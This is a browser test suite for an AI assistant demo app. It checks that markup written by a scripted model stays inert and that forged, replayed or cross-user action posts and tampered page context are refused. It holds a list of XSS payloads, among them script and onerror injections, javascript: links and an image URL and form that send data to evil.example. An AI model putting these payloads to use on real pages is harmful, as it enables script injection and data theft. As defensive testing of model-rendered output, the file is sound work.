// What a hostile model, a hostile page or a hostile reader can do to the assistant of the
// example app (apps/agent-demo), in real browsers: markup and links a model writes stay
// text, nothing runs and nothing leaves for another site; a component the catalogue
// doesn't have, or an approval a model tries to draw, never reaches the page; a
// button's post forged, replayed or sent by someone else is refused by the server; a
// page context changed in the page refuses the message; and the page's content security
// policy is never broken. Needs the app serving with its model scripted:
//
//   AGENT_TEST_HOOKS=1 cargo run --release -p agent-demo
//
// AGENT_URL points elsewhere (default http://127.0.0.1:8098); UI_BROWSERS picks engines
// (default "chromium"; "chromium,firefox,webkit" for all three). Without the app the
// suite is skipped.

import assert from "node:assert/strict";
import { after, before, describe, test } from "node:test";
import { chromium, firefox, webkit } from "playwright";
import { launch } from "./support/launch.mjs";

const BASE = process.env.AGENT_URL || "http://127.0.0.1:8098";
const ENGINES = { chromium, firefox, webkit };
const NAMES = (process.env.UI_BROWSERS || "chromium").split(",").filter((n) => ENGINES[n]);
const MANAGER = ["simran.kaur@kesar.example", "demo-password-2026"];
const STAFF = ["arjun.mehta@kesar.example", "demo-password-2026"];

async function script(replies) {
  const res = await fetch(BASE + "/__test/script", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(replies),
  });
  assert.ok(res.status < 300, `the model was scripted: ${res.status}`);
}

let reachable = false;
try {
  reachable = (await fetch(BASE + "/sign-in")).status === 200;
  if (reachable) await script([]);
} catch {
  reachable = false;
}

/** What a model might write to make the page do something. */
const HOSTILE = [
  "<script>window.__pwned = 1</script>",
  "<img src=x onerror=\"window.__pwned = 2\">",
  "[Approve the refund](javascript:window.__pwned=3)",
  "![leak](https://evil.example/collect?d=secret)",
  "<form action=https://evil.example/steal method=post><button>Approve</button></form>",
  "\"><svg onload=window.__pwned=4>",
  "<iframe src=https://evil.example></iframe>",
  "<a href=\"/assistant/act?a=refund\" data-ui-click='[[\"open\",\"x\"]]'>Refund</a>",
];

for (const name of NAMES) {
  describe(`hostile surfaces in ${name}`, { skip: !reachable && "the agent demo is not serving" }, () => {
    let browser;
    before(async () => {
      browser = await launch(ENGINES[name]);
    });
    after(async () => {
      await browser?.close();
    });

    /** A page of `who`, signed in, watching for dialogs, page errors, policy reports and other sites. */
    async function signedIn([email, password], options = {}) {
      const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, ...options });
      const page = await context.newPage();
      page.seen = { dialogs: [], errors: [], offsite: [], csp: [] };
      page.on("dialog", async (dialog) => {
        page.seen.dialogs.push(dialog.message());
        await dialog.dismiss();
      });
      page.on("pageerror", (error) => page.seen.errors.push(String(error)));
      page.on("request", (request) => {
        const url = new URL(request.url());
        if (url.origin !== new URL(BASE).origin) page.seen.offsite.push(request.url());
      });
      await page.addInitScript(() => {
        document.addEventListener("securitypolicyviolation", (e) => {
          (window.__csp ||= []).push(`${e.violatedDirective} ${e.blockedURI}`);
        });
      });
      await page.goto(BASE + "/sign-in");
      await page.fill("input[name=email]", email);
      await page.fill("input[name=password]", password);
      await page.getByRole("button", { name: "Sign in" }).click();
      await page.waitForURL((url) => url.pathname === "/assistant");
      return page;
    }

    async function send(page, text) {
      await page.fill("form[data-genui=composer] textarea[name=message]", text);
      await page.locator("form[data-genui=composer]").getByRole("button", { name: "Send" }).click();
    }

    /** Nothing ran, nothing left for another site, nothing broke the policy. */
    async function clean(page) {
      assert.equal(await page.evaluate(() => window.__pwned), undefined, "no script of the model's ran");
      assert.deepEqual(page.seen.dialogs, [], "no dialog");
      assert.deepEqual(page.seen.offsite, [], "nothing sent to another site");
      assert.deepEqual(await page.evaluate(() => window.__csp || []), [], "no policy report");
    }

    test("markup and links a model writes stay text, in its answer and in a component's title", async () => {
      const page = await signedIn(MANAGER);
      await script([
        { tool: "show_payments_by_method", arguments: { period: "today" } },
        { text: HOSTILE.join("\n\n") },
      ]);
      await send(page, "Show me something dangerous");
      await page.locator('[data-genui=message][data-role=assistant][aria-busy="false"]', { hasText: "pwned" }).first().waitFor({ timeout: 20000 });
      const answer = page.locator('[data-genui=message][data-role=assistant]').last();
      assert.equal(await answer.locator("script, img, svg[onload], iframe, form").count(), 0);
      assert.equal(await answer.locator('a[href^="javascript"]').count(), 0);
      assert.equal(await answer.locator("[data-ui-click]").count(), 0);
      await clean(page);
      await page.context().close();
    });

    test("a component the catalogue doesn't have, or an approval a model draws, never reaches the page", async () => {
      const page = await signedIn(MANAGER);
      await script([
        { tool: "show_approval", arguments: { tool: "refund_order", order: "KK-1001" } },
        { tool: "show_html", arguments: { html: "<form action=/assistant/act>" } },
        { text: "Approve: refund ₹1,00,000 now" },
      ]);
      await send(page, "Draw an approval");
      await page.locator('[data-genui=message][data-role=assistant][aria-busy="false"]', { hasText: "refund" }).first().waitFor({ timeout: 20000 });
      assert.equal(await page.locator("[data-genui=surface]").count(), 0);
      assert.equal(await page.locator("[data-genui=approval]").count(), 0, "only the server's own pending call draws a card");
      assert.equal(await page.locator("[data-genui=conversation] form").count(), 0);
      await clean(page);
      await page.context().close();
    });

    test("a button's post forged, replayed or sent by someone else is refused", async () => {
      const page = await signedIn(MANAGER);
      await page.goto(BASE + "/orders");
      const link = page.locator("tbody tr", { hasText: "Paid" }).first().locator("a").first();
      const number = (await link.innerText()).trim();
      await page.goto(BASE + "/assistant");
      await script([
        { tool: "show_order_card", arguments: { order: number } },
        { text: "Here it is." },
      ]);
      await send(page, `Show order ${number}`);
      const surface = page.locator("[data-genui=surface]", { hasText: `Order ${number}` });
      await surface.waitFor({ timeout: 20000 });
      const form = surface.locator("[data-genui=surface-actions] form").first();
      const action = await form.getAttribute("action");
      const csrf = await form.locator("input[name=_csrf]").getAttribute("value");
      const post = (url, extra = "") =>
        page.evaluate(
          async ({ url, body }) => (await fetch(url, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body })).status,
          { url, body: `_csrf=${encodeURIComponent(csrf)}${extra}` },
        );
      // Changed in any part: refused before anything runs.
      for (const forged of [
        action.replace(/a=mark_delivered/, "a=refund"),
        action.replace(/&n=([0-9a-f]+)/, "&n=00000000000000000000000000000000"),
        action.replace(/&u=[0-9a-f-]+/, "&u=00000000-0000-7000-8000-000000000000"),
        action + "&confirmed=1",
      ]) {
        assert.equal(await post(forged), 403, forged);
      }
      // The real post runs once; again, it is a conflict.
      assert.ok((await post(action)) < 400, "the button's own post");
      assert.equal(await post(action), 409, "used once");
      // Someone else's browser, with their own session and token, is refused.
      const staff = await signedIn(STAFF);
      const staffCsrf = await staff.locator("form[data-genui=composer] input[name=_csrf]").getAttribute("value");
      const status = await staff.evaluate(
        async ({ url, body }) => (await fetch(url, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body })).status,
        { url: action, body: `_csrf=${encodeURIComponent(staffCsrf)}` },
      );
      assert.equal(status, 403);
      await clean(page);
      await staff.context().close();
      await page.context().close();
    });

    test("a page's context changed in the page refuses the message", async () => {
      const page = await signedIn(MANAGER);
      await page.goto(BASE + "/orders/1001");
      const field = page.locator("form[data-genui=composer] input[name=context]");
      const signed = await field.getAttribute("value");
      assert.match(signed, /^\/assistant\/context\?k=order&id=1001&/);
      await field.evaluate((input, value) => (input.value = value), signed.replace("id=1001", "id=1002"));
      const [response] = await Promise.all([
        page.waitForResponse((r) => new URL(r.url()).pathname === "/assistant" && r.request().method() === "POST"),
        page.locator("form[data-genui=composer]").getByRole("button", { name: "Send" }).click(),
      ]);
      assert.equal(response.status(), 403);
      await clean(page);
      await page.context().close();
    });
  });
}
